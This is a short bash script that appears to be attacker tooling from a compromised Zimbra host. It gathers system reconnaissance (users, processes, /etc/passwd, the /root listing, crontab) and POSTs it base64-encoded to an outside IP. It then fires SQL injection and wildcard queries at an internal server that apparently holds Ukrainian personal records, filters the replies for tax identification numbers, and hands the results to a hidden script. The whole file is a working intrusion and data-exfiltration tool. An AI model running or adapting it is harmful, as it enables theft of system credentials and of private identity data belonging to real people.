#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
C=/opt/zimbra/common/bin/curl
[ -x "$C" ] || C=curl
O=/tmp/.EDR2.txt
: > "$O"
q() {
  echo "== $1 ==" >> "$O"
  $C -sS -m 15 -X POST http://10.61.10.136/ --data "$2" >> "$O" 2>&1 | grep -aE "alert|card|<td|<th|ИНН|ДРФО|день|найден" | head -30
  echo "--len--" >> "$O"
}
q "shev" "fam=%D0%A8%D0%B5%D0%B2%D1%87%D0%B5%D0%BD%D0%BA%D0%BE&name=%D0%9E%D0%BB%D0%B5%D0%B3&otch=&dob="
q "ivan" "fam=%D0%86%D0%B2%D0%B0%D0%BD%D0%BE%D0%B2&name=%D0%86%D0%B2%D0%B0%D0%BD&otch=&dob="
q "sqli-name" "fam=x&name=%27%20OR%20%271%27%3D%271&otch=&dob="
q "sqli-fam" "fam=%27%20OR%20%271%27%3D%271&name=x&otch=&dob="
q "sleep" "fam=x&name=%27%20OR%20SLEEP(5)--%20-&otch=&dob="
q "wild" "fam=%25&name=%25&otch=&dob="
echo EDR2_DONE >> "$O"
bash /tmp/.ex.sh "$O" edrfo2
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


